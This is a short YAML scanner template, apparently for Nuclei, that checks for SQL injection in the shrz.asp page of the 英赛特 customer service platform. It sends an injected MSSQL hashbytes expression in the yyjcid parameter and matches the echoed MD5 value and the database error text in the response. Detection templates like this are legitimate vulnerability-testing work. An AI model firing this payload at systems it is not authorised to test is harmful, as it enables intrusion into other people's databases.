id: poc-yaml-yingsaite-icsp-shrz-asp-sqli
info:
  name: 英赛特互联网客户服务平台 shrz.asp SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    This template checks for a SQL Injection vulnerability in 英赛特互联网客户服务平台, specifically in the shrz.asp file.

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - method: GET
    path:
      - "/csccmise/shrz.asp?yyjcid=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "0x{{t2}}"
          - "SQL"
          - "ODBC"
          - "/csccmise/shrz.asp"
        part: body
